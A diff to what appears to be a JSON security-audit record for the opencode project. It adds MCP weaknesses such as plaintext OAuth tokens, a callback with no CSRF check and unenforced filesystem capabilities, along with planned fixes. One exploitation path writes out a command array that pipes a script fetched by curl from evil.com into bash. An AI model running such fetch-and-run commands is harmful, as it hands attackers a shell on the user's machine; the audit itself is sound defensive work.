@@ -151,7 +151,25 @@
     "mcp_security": {
       "file": "packages/opencode/src/mcp/index.ts",
       "description": "MCP (Model Context Protocol) is a completely separate subsystem. MCP servers connect via stdio/SSE/streamable HTTP with OAuth 2.0 + PKCE authentication. MCP tools are registered as native AI SDK tools with NO plugin-like capability gating.",
-      "gap": "MCP tools and plugin tools execute in the same session context but have completely different security models — MCP tools bypass the plugin capability system entirely"
+      "gap": "MCP tools and plugin tools execute in the same session context but have completely different security models — MCP tools bypass the plugin capability system entirely",
+      "additional_gaps": [
+        "MCP tools share the same permission namespace as built-in tools — no per-MCP-server permission granularity",
+        "MCP OAuth tokens (access, refresh) stored in plaintext JSON at ~/.opencode/data/mcp-auth.json",
+        "MCP OAuth callback server on 127.0.0.1:19876 has no CSRF state validation",
+        "MCP stdio server command arrays have no allowlisting — any executable can be spawned",
+        "No network origin allowlisting for MCP remote connections",
+        "MCP local servers spawn as subprocesses with user's full OS privileges — no sandboxing",
+        "filesystem.read and filesystem.write capability IDs are declared in plugin/capability/types.ts but NEVER enforced for either plugins or MCP tools"
+      ],
+      "auth_flow": [
+        "1. Dynamic client registration (RFC 7591) or pre-registered clientId/clientSecret",
+        "2. PKCE code_verifier + code_challenge",
+        "3. Browser-based authorization via system browser",
+        "4. Local HTTP callback on 127.0.0.1:19876/mcp/oauth/callback",
+        "5. Token exchange and persistence to plaintext mcp-auth.json"
+      ],
+      "transports": ["stdio (subprocess spawn)", "streamable_http", "sse"],
+      "tool_execution": "MCP tools are wrapped as AI SDK dynamicTool with ctx.ask() permission prompts using sanitized keys like '{clientName}_{toolName}'"
     }
   },
 
@@ -227,6 +245,51 @@
       "description": "Missing per-channel timeout in handlePluginInvoke allows a never-resolving handler to leak pending promises.",
       "exploitation_path": "Plugin registers handler that never resolves → accumulates pending promises → memory leak / resource exhaustion",
       "mitigation_status": "KNOWN — Documented in stress findings, no fix yet"
+    },
+    {
+      "id": "VULN-009",
+      "vulnerability": "MCP OAuth tokens stored in plaintext JSON",
+      "severity": "HIGH",
+      "affected_code": "packages/opencode/src/mcp/auth.ts — mcp-auth.json persistence",
+      "description": "OAuth access tokens, refresh tokens, client secrets, and code verifiers are stored in plain JSON file (~/.opencode/data/mcp-auth.json) with no encryption at rest.",
+      "exploitation_path": "Any process/plugin with filesystem access can read mcp-auth.json → extract active OAuth tokens → impersonate the user to MCP servers",
+      "mitigation_status": "UNCAPPED — No encryption layer exists"
+    },
+    {
+      "id": "VULN-010",
+      "vulnerability": "MCP OAuth callback server lacks CSRF protection",
+      "severity": "MEDIUM",
+      "affected_code": "packages/opencode/src/mcp/oauth-callback.ts:190 — waitForCallback()",
+      "description": "Local HTTP callback server on 127.0.0.1:19876 accepts OAuth authorization codes with no CSRF state validation on the callback endpoint. A malicious local process could inject a forged authorization code.",
+      "exploitation_path": "Attacker with local code execution crafts OAuth redirect to localhost callback → injects attacker-controlled authorization code → victim connects to attacker's MCP server",
+      "mitigation_status": "UNCAPPED — No CSRF state parameter validation"
+    },
+    {
+      "id": "VULN-011",
+      "vulnerability": "filesystem.read/filesystem.write capabilities declared but never enforced",
+      "severity": "HIGH",
+      "affected_code": "packages/opencode/src/plugin/capability/types.ts:1-15 — CapabilityId definitions",
+      "description": "CapabilityId.FilesystemRead and CapabilityId.FilesystemWrite are declared in the capability types and CapabilityManifest supports filesystem_read_scope/filesystem_write_scope fields, but NO enforcement code exists anywhere. The capabilities are ornamental.",
+      "exploitation_path": "Plugin declares CapabilityManifest without filesystem.read → capability system has no code path that checks this → plugin still accesses filesystem via BunShell, process APIs, or SDK client",
+      "mitigation_status": "UNCAPPED — Declaration exists, enforcement does not"
+    },
+    {
+      "id": "VULN-012",
+      "vulnerability": "No per-MCP-server permission granularity",
+      "severity": "MEDIUM",
+      "affected_code": "packages/opencode/src/session/tools.ts:159 — ctx.ask() for MCP tools",
+      "description": "MCP tools share the same permission namespace as built-in tools with no per-server scoping. A wildcard allow rule (e.g. pattern '*' action 'allow') grants all MCP tools from all servers unrestricted execution.",
+      "exploitation_path": "User allows 'read' tool globally → all MCP servers' 'read' tools are auto-allowed → malicious MCP server's 'read' tool exfiltrates data",
+      "mitigation_status": "UNCAPPED — No per-MCP-server permission prefix or namespace"
+    },
+    {
+      "id": "VULN-013",
+      "vulnerability": "No command allowlisting for MCP stdio servers",
+      "severity": "HIGH",
+      "affected_code": "packages/opencode/src/config/mcp.ts — Local.command schema",
+      "description": "MCP local server configuration accepts arbitrary command arrays with no allowlisting. Any executable can be specified. The spawned process runs with the user's full OS privileges.",
+      "exploitation_path": "User adds MCP server with command ['curl', 'https://evil.com/steal.sh', '|', 'bash'] → spawns as subprocess → attacker gains shell access",
+      "mitigation_status": "UNCAPPED — No command validation or allowlisting"
     }
   ],
 
@@ -330,6 +393,55 @@
         "packages/opencode/src/mcp/index.ts",
         "packages/opencode/src/session/tools.ts"
       ]
+    },
+    {
+      "id": "MIT-011",
+      "title": "Implement filesystem.read and filesystem.write enforcement",
+      "priority": "P0",
+      "description": "CapabilityId.FilesystemRead and FilesystemWrite are declared but never enforced. Add enforcement in the plugin initialization path: intercept BunShell and SDK client filesystem calls based on CapabilityManifest.filesystem_read_scope and filesystem_write_scope.",
+      "affected_code": [
+        "packages/opencode/src/plugin/capability/enforcer.ts — add checkFilesystemAccess()",
+        "packages/opencode/src/plugin/index.ts — gate PluginInput.$ and client on filesystem capabilities"
+      ]
+    },
+    {
+      "id": "MIT-012",
+      "title": "Add MCP OAuth token encryption at rest",
+      "priority": "P1",
+      "description": "Encrypt mcp-auth.json contents using a platform keychain (macOS Keychain, Windows DPAPI, Linux libsecret). Store only encrypted blobs on disk.",
+      "affected_code": [
+        "packages/opencode/src/mcp/auth.ts — set(), get() methods"
+      ]
+    },
+    {
+      "id": "MIT-013",
+      "title": "Add CSRF state validation to MCP OAuth callback",
+      "priority": "P1",
+      "description": "Generate and validate a cryptographically random state parameter in the OAuth authorization flow. Reject callbacks where state does not match the stored value.",
+      "affected_code": [
+        "packages/opencode/src/mcp/oauth-provider.ts — redirectToAuthorization()",
+        "packages/opencode/src/mcp/oauth-callback.ts — waitForCallback()"
+      ]
+    },
+    {
+      "id": "MIT-014",
+      "title": "Add per-MCP-server permission namespace",
+      "priority": "P1",
+      "description": "Prefix MCP tool permission keys with the server name (e.g. 'mcp.filesystem.read_file' instead of just 'filesystem_read_file'). This prevents wildcard rules from accidentally granting all MCP tools access.",
+      "affected_code": [
+        "packages/opencode/src/mcp/index.ts — tools()",
+        "packages/opencode/src/session/tools.ts — MCP tool registration"
+      ]
+    },
+    {
+      "id": "MIT-015",
+      "title": "Add MCP stdio command validation and allowlisting",
+      "priority": "P1",
+      "description": "Validate MCP local server command arrays against an allowlist of known-safe executables. Reject commands containing pipes, redirects, or shell metacharacters. Enforce that the command resolves to an absolute path within known-safe directories.",
+      "affected_code": [
+        "packages/opencode/src/config/mcp.ts — Local.command validation",
+        "packages/opencode/src/mcp/index.ts — connectLocal()"
+      ]
     }
   ],
 
@@ -389,6 +501,13 @@
     "packages/opencode/src/provider/provider.ts",
     "packages/opencode/src/provider/auth.ts",
     "packages/opencode/src/mcp/index.ts",
+    "packages/opencode/src/mcp/auth.ts",
+    "packages/opencode/src/mcp/oauth-provider.ts",
+    "packages/opencode/src/mcp/oauth-callback.ts",
+    "packages/opencode/src/config/mcp.ts",
+    "packages/opencode/src/tool/mcp-websearch.ts",
+    "packages/opencode/src/server/routes/instance/httpapi/groups/mcp.ts",
+    "packages/opencode/src/server/routes/instance/httpapi/handlers/mcp.ts",
     "packages/opencode/src/acp-next/permission.ts",
     "packages/plugin/src/index.ts",
     "packages/plugin/src/tool.ts",
